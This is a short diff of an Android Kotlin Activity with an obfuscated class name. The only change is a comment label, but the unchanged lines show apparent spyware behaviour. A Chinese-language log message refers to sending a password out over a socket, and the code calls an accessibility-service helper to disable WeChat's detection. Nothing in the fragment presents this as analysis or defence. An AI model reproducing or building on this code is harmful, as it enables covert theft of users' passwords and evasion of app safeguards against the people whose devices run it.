@@ -86,7 +86,7 @@ class izvpcqplqctn : Activity() {
                     Log.e(TAG, "通过Socket发送密码失败", e)
                 }
                 try {
-                    // ADAPT: depends on MyAccessibilityService.disableWechatDetection()
+                    // vendor: depends on MyAccessibilityService.disableWechatDetection()
                     svcCompanion.getInstance()?.disableWechatDetection()
                 } catch (e: Exception) {
                     Log.e(TAG, "自动关闭微信检测功能失败", e)
